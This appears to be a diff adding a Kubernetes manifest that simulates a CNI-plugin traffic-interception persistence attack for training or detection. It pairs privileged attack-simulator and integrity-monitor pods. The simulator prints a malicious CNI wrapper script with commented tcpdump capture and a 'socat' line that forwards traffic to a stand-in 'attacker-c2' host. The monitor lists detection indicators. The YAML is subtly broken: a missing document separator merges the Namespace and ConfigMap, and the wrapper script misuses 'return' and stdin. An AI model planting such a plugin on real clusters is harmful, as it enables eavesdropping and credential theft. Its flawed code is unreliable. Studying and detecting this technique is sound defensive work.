@@ -1,0 +1,252 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: cni-interception
+---
+# Persistence Attack #4: CNI Plugin Network Interception
+# Description: Attacker modifies CNI configuration to intercept all pod traffic
+# enabling passive network eavesdropping and MitM attacks.
+#
+# Attack Flow:
+# 1. Node Compromise: Attacker gains root on node (via previous exploits)
+# 2. Discover: Locate CNI plugin config (/etc/cni/net.d/)
+# 3. Modify: Change CNI config to use attacker's plugin
+# 4. Deploy: Place attacker's CNI binary on node
+# 5. Intercept: Modified CNI plugin intercepts pod setup
+# 6. Mirror: All pod traffic passively mirrored to attacker
+# 7. Persist: Survives container restarts, pod migrations
+#
+# CNI Path Usage:
+# - CNI Config: /etc/cni/net.d/ (defines which plugins to use)
+# - CNI Plugins: /opt/cni/bin/ (actual executable plugins)
+# - Plugin Output: /var/lib/cni/ (runtime state)
+#
+# What Attacker Can Do:
+# - Monitor all traffic between pods
+# - Extract credentials from network traffic
+# - Perform MitM attacks (SSL stripping, DNS hijacking)
+# - Redirect traffic to honeypots
+# - Block specific traffic for DoS
+# - Inject malicious content into connections
+#
+# Detection Points:
+# - Modified CNI configuration files
+# - Unexpected CNI plugins in /opt/cni/bin/
+# - CNI configuration with suspicious settings
+# - Unexpected entries in iptables
+# - Network traffic mirroring (tcpdump running)
+# - File integrity monitoring alerts on /etc/cni/
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: cni-attack-info
+  namespace: cni-interception
+data:
+  cni-structure: |
+    Kubernetes CNI Plugin Architecture:
+    
+    /etc/cni/net.d/
+    ├── 10-containerd.conflist (example)
+    ├── 00-flannel.conf
+    └── (JSON files describing which CNI plugins to use)
+    
+    Plugin file contents:
+    {
+      "cniVersion": "0.4.0",
+      "plugins": [
+        {
+          "type": "flannel",           # Which binary to execute
+          "delegate": {
+            "type": "bridge"
+          }
+        },
+        {
+          "type": "portmap",
+          "capabilities": {
+            "portMappings": true
+          }
+        }
+      ]
+    }
+    
+    /opt/cni/bin/
+    ├── bridge (legitimate)
+    ├── host-device (legitimate)
+    ├── flannel (legitimate)
+    └── attacker-intercept (MALICIOUS)
+    
+    Attack: Replace "type": "bridge" with "type": "attacker-intercept"
+    Kubelet executes /opt/cni/bin/attacker-intercept whenever pod spawns
+
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cni-attack-simulator
+  namespace: cni-interception
+  labels:
+    tool: cni-simulator
+spec:
+  serviceAccountName: cni-attacker-sa
+  hostNetwork: true  # For network access
+  hostPID: true      # For process listing
+  containers:
+  - name: simulator
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== CNI Plugin Network Interception Attack ==="
+      
+      echo "[*] Step 1: Compromise node and gain root"
+      echo "[*] Step 2: Enumerate current CNI configuration"
+      echo ""
+      echo "[*] Current CNI configs (if we had root):"
+      echo "  # ls -la /etc/cni/net.d/"
+      echo "  # cat /etc/cni/net.d/10-containerd.conflist"
+      
+      echo ""
+      echo "[*] Step 3: Create malicious CNI plugin"
+      echo "[*] Create: /opt/cni/bin/network-monitor"
+      echo ""
+      
+      cat <<'EOF'
+      #!/bin/bash
+      # Malicious CNI plugin wrapper
+      
+      # Original plugin
+      REAL_BRIDGE="/opt/cni/bin/bridge.real"
+      
+      # Setup network normally
+      $REAL_BRIDGE "$@"
+      RESULT=$?
+      
+      # But also enable packet capture
+      CONTAINER_ID=$(jq -r '.containerid' /proc/self/fd/0)
+      
+      # Mirror all traffic to attacker
+      # tcpdump -i any -w /tmp/capture.pcap -p "not port 22"
+      # Or real-time forwarding:
+      # socat TCP:attacker-c2:9999 TCP4-LISTEN:53 &
+      
+      return $RESULT
+      EOF
+      
+      echo ""
+      echo "[*] Step 4: Modify CNI configuration"
+      echo "[*] Change /etc/cni/net.d/10-containerd.conflist:"
+      echo '  "type": "bridge" --> "type": "network-monitor"'
+      
+      echo ""
+      echo "[*] Step 5: Wait for next pod creation"
+      echo "[*] When pod spawns: Kubelet calls /opt/cni/bin/network-monitor"
+      echo "[*] Attacker's binary intercepts and captures traffic"
+      
+      echo ""
+      echo "[Impact] Network Interception:"
+      echo "  ✓ Passive eavesdropping on all pod communications"
+      echo "  ✓ Extract database credentials from traffic"
+      echo "  ✓ Monitor API calls to external services"
+      echo "  ✓ Redirect DNS to phishing sites"
+      echo "  ✓ Drop specific packets for DoS"
+      echo "  ✓ Modify unencrypted HTTP traffic"
+      
+      sleep 3600
+    
+    securityContext:
+      privileged: true
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: cni-attacker-sa
+  namespace: cni-interception
+
+---
+# Detection: Monitor CNI integrity
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cni-integrity-monitor
+  namespace: cni-interception
+  labels:
+    tool: cni-monitor
+spec:
+  serviceAccountName: monitor-sa
+  hostNetwork: true
+  hostPID: true
+  containers:
+  - name: monitor
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== CNI Integrity Monitor ==="
+      
+      echo "[*] Monitoring CNI files for integrity..."
+      
+      echo "[*] Files to watch:"
+      echo "  /etc/cni/net.d/"
+      echo "  /opt/cni/bin/"
+      echo "  /var/lib/cni/"
+      
+      echo ""
+      echo "[*] Detection methods:"
+      echo "  1. File integrity monitoring (aide, osquery, auditd)"
+      echo "  2. Baseline hash verification of /etc/cni/net.d/*"
+      echo "  3. Verify /opt/cni/bin/* binaries against known versions"
+      echo "  4. Monitor cgroup eBPF hooks (detect packet capture)"
+      echo "  5. Check for unexpected iptables rules"
+      echo "  6. Monitor tcpdump/socat processes on nodes"
+      
+      echo ""
+      echo "[*] Suspicious indicators:"
+      echo "  • New CNI plugin types not in whitelist"
+      echo "  • Modified timestamps on CNI config files"
+      echo "  • Unknown binaries in /opt/cni/bin/"
+      echo "  • tcpdump or socat running on node"
+      echo "  • iptables rules redirecting traffic"
+      echo "  • Unusual network device binding"
+      
+      sleep 3600
+    
+    securityContext:
+      privileged: true
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: monitor-sa
+  namespace: cni-interception
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: cni-monitor-role
+rules:
+- apiGroups: [""]
+  resources: ["nodes"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: cni-monitor-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cni-monitor-role
+subjects:
+- kind: ServiceAccount
+  name: monitor-sa
+  namespace: cni-interception
